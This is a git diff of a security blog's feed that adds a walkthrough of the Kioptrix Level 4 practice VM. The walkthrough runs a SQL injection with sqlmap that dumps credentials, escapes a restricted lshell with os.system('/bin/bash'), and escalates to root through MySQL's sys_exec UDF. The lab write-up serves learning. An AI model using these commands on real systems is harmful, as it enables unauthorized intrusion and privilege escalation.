@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2014-06-22T21:37:47+03:00</updated>
+  <updated>2014-06-26T00:20:43+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,205 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 4]]></title>
+    <link href="http://chousensha.github.io/blog/2014/06/22/pentest-lab-kioptrix-level-4/"/>
+    <updated>2014-06-22T22:39:14+03:00</updated>
+    <id>http://chousensha.github.io/blog/2014/06/22/pentest-lab-kioptrix-level-4</id>
+    <content type="html"><![CDATA[<p>This is the final vulnerable machine in the Kioptrix series. To set it up in VMware, create a new virtual machine with the advanced options and use existing virtual disk, pointing it at the Kioptrix 4 virtual disk.</p>
+
+<!-- more -->
+
+
+<p>Let&rsquo;s see what Nmap reveals:</p>
+
+<p>``` plain
+nmap -A -p1-65535 192.168.127.129</p>
+
+<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-22 22:35 EEST
+Nmap scan report for 192.168.127.129
+Host is up (0.00074s latency).
+Not shown: 39528 closed ports, 26003 filtered ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey:
+|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
+|<em>  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
+80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Site doesn&rsquo;t have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+MAC Address: 00:0C:29:1F:12:65 (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 &ndash; 2.6.33
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+
+<p>Host script results:
+|<em>nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery:
+|   OS: Unix (Samba 3.0.28a)
+|   Computer name: Kioptrix4
+|   NetBIOS computer name:
+|   Domain name: localdomain
+|   FQDN: Kioptrix4.localdomain
+|</em>  System time: 2014-06-22T18:36:57-04:00
+| smb-security-mode:
+|   Account that was used for smb scripts: guest
+|   User-level authentication
+|   SMB Security: Challenge/response passwords supported
+|<em>  Message signing disabled (dangerous, but default)
+|</em>smbv2-enabled: Server doesn&rsquo;t support SMBv2 protocol
+```</p>
+
+<p>Again, this seems to be a web based challenge. Navigating to the target website shows this:</p>
+
+<p><img class="center" src="/images/kio4.png" title="&lsquo;login&rsquo; &lsquo;login&rsquo;" ></p>
+
+<p>Supplying a single quote in the password field gives an error, which nicely discloses the database end as being MySQL:</p>
+
+<p><em>Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /var/www/checklogin.php on line 28
+Wrong Username or Password</em></p>
+
+<p>Sqlmap to the rescue!</p>
+
+<p>``` plain
+sqlmap -u &ldquo;<a href="http://192.168.127.129/checklogin.php">http://192.168.127.129/checklogin.php</a>&rdquo; &mdash;dbms=MySQL &mdash;level=5 &mdash;risk=3 &mdash;data=&ldquo;myusername=admin&amp;mypassword=test&rdquo; &mdash;dump</p>
+
+<p>Database: members
+Table: members
+[2 entries]
++&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+| id | username | password              |
++&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+| 1  | john     | MyNameIsJohn          |
+| 2  | robert   | ADGAdsafdfwt4gadfga== |
++&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+```</p>
+
+<p>Logging in with these credentials didn&rsquo;t yield anything though, all I could see was a member&rsquo;s control panel with no functionality. So I remembered the previous challenge that allowed SSH access, and tried to log in:</p>
+
+<p><code>plain
+root@kali:~# ssh john@192.168.127.129
+The authenticity of host '192.168.127.129 (192.168.127.129)' can't be established.
+RSA key fingerprint is 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.127.129' (RSA) to the list of known hosts.
+john@192.168.127.129's password:
+Welcome to LigGoat Security Systems - We are Watching
+== Welcome LigGoat Employee ==
+LigGoat Shell is in place so you  don't screw up
+Type '?' or 'help' to get the list of allowed commands
+john:~$
+</code></p>
+
+<p>Excellent! It&rsquo;s time for some sniffing around. This is not a normal shell, usual commands don&rsquo;t work, so let&rsquo;s see what&rsquo;s available with the help system.</p>
+
+<p><code>plain
+john:~$ help
+cd  clear  echo  exit  help  ll  lpath  ls
+</code></p>
+
+<p>Hmm, not much. Actions are restricted too, can&rsquo;t <em>cd</em> to wherever I want:</p>
+
+<p><code>plain
+john:~$ cd /
+*** forbidden path -&gt; "/"
+*** You have 0 warning(s) left, before getting kicked out.
+This incident has been reported.
+</code></p>
+
+<p>So I googled for a bit, and it appears this shell is a Python based limited shell (<a href="https://github.com/ghantoos/lshell">https://github.com/ghantoos/lshell</a>):</p>
+
+<blockquote><p>lshell is a shell coded in Python, that lets you restrict a user&rsquo;s environment to limited sets of commands, choose to enable/
+disable any command over SSH (e.g. SCP, SFTP, rsync, etc.), log user&rsquo;s commands, implement timing restriction, and more.</p></blockquote>
+
+<p>It is possible to escape from this shell by leveraging the <em>echo</em> command to call <em>os.system</em> in order to spawn a shell: <code>echo os.system(&lsquo;/bin/bash&rsquo;)</code></p>
+
+<p><code>plain
+john:~$ echo os.system('/bin/bash')
+john@Kioptrix4:~$ id
+uid=1001(john) gid=1001(john) groups=1001(john)
+</code></p>
+
+<p>Poking around, I found the following information in <code>/var/www/john/john.php</code>:</p>
+
+<p><code>plain
+$host="localhost"; // Host name
+$username="root"; // Mysql username
+$password=""; // Mysql password
+</code></p>
+
+<p>So, root doesn&rsquo;t have a password for MySQL? Let&rsquo;s check:</p>
+
+<p>``` plain
+john@Kioptrix4:/var/www/john$ mysql -u root -h localhost
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 8
+Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</p>
+
+<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the buffer.
+```</p>
+
+<p><a href="http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/">Here</a> I have found a way to get root privileges from a MySQL server running as root. Here&rsquo;s a quick summary:</p>
+
+<ul>
+<li><p>It is possible to escalate from MySQL server root level to system root by using User Defined Functions (UDF)</p></li>
+<li><p>We need the <a href="https://github.com/mysqludf/lib_mysqludf_sys">lib_mysqludf_sys.so</a> library that contains some useful functions that can interact with the OS. The most important ones are <strong>sys_exec</strong> (executes the command and returns the exit status) and <strong>sys_eval</strong> (executes the command and returns the standard output)</p></li>
+</ul>
+
+
+<p>The next step would be to find a way to get the library on the machine with our MySQL server. But that&rsquo;s not necessary in this case, because it&rsquo;s already on the server!</p>
+
+<p><code>plain
+john@Kioptrix4:~$ whereis lib_mysqludf_sys.so
+lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so
+</code></p>
+
+<p>It took a bit of googling and trial and error until I found a way that worked in getting me to a root shell. <a href="http://superuser.com/questions/400723/how-do-i-create-a-superuser-from-the-command-line-in-ubuntu">Here</a> is a useful post. The relevant part for us is this:</p>
+
+<blockquote><p>Until Ubuntu 11.10, the Unix group for administrators with root privileges through sudo had been admin. Starting with Ubuntu
+12.04  LTS, it is now sudo, for compatibility with Debian and sudo itself. However, for backwards compatibility, admin group
+members are still recognized as administrators</p></blockquote>
+
+<p>So it is possible to make the john account to be part of the admin group, that is equivalent to the sudo group. So from the MySQL prompt, run this:</p>
+
+<p><code>sql
+SELECT sys_exec('usermod -a -G admin');
+</code></p>
+
+<p>What that does is it modifies john&rsquo;s account, appending it to the admin group. So let&rsquo;s do it on the MySQL command line:</p>
+
+<p><code>sql
+mysql&gt; select sys_exec('usermod -a -G admin john');
++--------------------------------------+
+| sys_exec('usermod -a -G admin john') |
++--------------------------------------+
+| NULL                                 |
++--------------------------------------+
+1 row in set (0.11 sec)
+</code></p>
+
+<p>Now from john&rsquo;s shell:</p>
+
+<p><code>plain
+john@Kioptrix4:~$ sudo su
+[sudo] password for john:
+root@Kioptrix4:/home/john# whoami
+root
+</code></p>
+
+<p>Awesome! We finally got root access! In root&rsquo;s directory there is another </code>congrats.txt</code> file that tells us there are at least 2 different tested ways to get root on this system. It sure was an interesting machine, and my favorite in the series, because it wasn&rsquo;t as straightforward as the others, and I had to look for more information and try (and fail) different approaches before I hit upon the winning one.</p>
+
+<p>Here&rsquo;s today&rsquo;s fortune cookie:</p>
+
+<blockquote><p>You single-handedly fought your way into this hopeless mess.</p></blockquote>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pentest lab - Kioptrix Level 3]]></title>
@@ -225,12 +424,12 @@ Table: dev_accounts
 <p>Thankfully, these credentials work for SSH login, so I could get rid of the Metasploit shell which kept throwing EOF errors if I didn&rsquo;t interact with it for a while.</p>
 
 <p>``` plain
-ssh <a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#108;&#111;&#110;&#x65;&#102;&#101;&#114;&#x72;&#x65;&#116;&#x40;&#107;&#105;&#x6f;&#112;&#x74;&#114;&#x69;&#120;&#x33;&#46;&#99;&#111;&#x6d;">&#108;&#x6f;&#x6e;&#101;&#x66;&#x65;&#114;&#x72;&#x65;&#116;&#x40;&#x6b;&#x69;&#x6f;&#x70;&#116;&#114;&#105;&#x78;&#51;&#46;&#x63;&#x6f;&#109;</a>
+ssh <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x6c;&#x6f;&#110;&#x65;&#x66;&#x65;&#114;&#x72;&#101;&#x74;&#x40;&#x6b;&#105;&#x6f;&#112;&#x74;&#114;&#105;&#x78;&#51;&#46;&#x63;&#x6f;&#x6d;">&#x6c;&#x6f;&#110;&#101;&#102;&#x65;&#114;&#x72;&#101;&#x74;&#64;&#x6b;&#105;&#111;&#x70;&#116;&#x72;&#105;&#x78;&#x33;&#x2e;&#x63;&#111;&#x6d;</a>
 The authenticity of host &lsquo;kioptrix3.com (192.168.127.128)&rsquo; can&rsquo;t be established.
 RSA key fingerprint is 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd.
 Are you sure you want to continue connecting (yes/no)? yes
 Warning: Permanently added &lsquo;kioptrix3.com&rsquo; (RSA) to the list of known hosts.
-<a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#108;&#x6f;&#x6e;&#x65;&#102;&#101;&#x72;&#x72;&#x65;&#x74;&#64;&#x6b;&#105;&#111;&#112;&#x74;&#114;&#105;&#120;&#51;&#46;&#x63;&#111;&#x6d;">&#x6c;&#111;&#110;&#101;&#102;&#101;&#x72;&#114;&#x65;&#116;&#x40;&#x6b;&#x69;&#111;&#112;&#116;&#114;&#x69;&#x78;&#51;&#x2e;&#x63;&#x6f;&#x6d;</a>&rsquo;s password:
+<a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#108;&#111;&#x6e;&#101;&#102;&#101;&#x72;&#x72;&#101;&#116;&#64;&#107;&#105;&#111;&#x70;&#116;&#114;&#x69;&#x78;&#x33;&#46;&#99;&#111;&#x6d;">&#x6c;&#111;&#110;&#x65;&#x66;&#x65;&#114;&#x72;&#x65;&#x74;&#x40;&#x6b;&#x69;&#111;&#112;&#x74;&#114;&#105;&#x78;&#51;&#x2e;&#99;&#111;&#x6d;</a>&rsquo;s password:
 Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</p>
 
 <p>The programs included with the Ubuntu system are free software;
